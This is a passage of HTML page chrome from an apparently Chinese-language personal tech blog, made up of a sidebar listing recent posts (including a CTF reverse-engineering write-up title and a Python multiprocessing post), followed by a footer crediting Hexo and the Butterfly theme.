href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/03/Reverse/lighthouse%20%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="lighthouse 使用指南">lighthouse 使用指南</a><time datetime="2024-03-03T15:45:14.000Z" title="发表于 2024-03-03 23:45:14">2024-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/19/Life/ES%E5%B0%8F%E4%B8%BB%E6%9C%BA%E6%8A%98%E8%85%BE%E8%AE%B0/" title="ES小主机折腾记">ES小主机折腾记</a><time datetime="2024-02-19T03:05:01.000Z" title="发表于 2024-02-19 11:05:01">2024-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/20/WriteUp/HFCTF2022-RE/" title="HFCTF2022 RE">HFCTF2022 RE</a><time datetime="2022-03-20T12:04:53.000Z" title="发表于 2022-03-20 20:04:53">2022-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/09/WriteUp/%E7%AE%80%E7%AE%80%E5%8D%95%E5%8D%95%E5%AF%86%E7%A0%81%E9%A2%98/" title="简简单单密码题">简简单单密码题</a><time datetime="2022-03-09T12:08:44.000Z" title="发表于 2022-03-09 20:08:44">2022-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/03/Python/Python-multiprocess-learning/" title="Python multiprocess learning">Python multiprocess learning</a><time datetime="2022-02-03T06:25:30.000Z" title="发表于 2022-02-03 14:25:30">2022-02-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2024/02/20/h3iOcSdRqel45vD.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By devoke</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/"></script><script src="/"></script><script src="/"></script><div class="js-pjax"></div></div></body></html>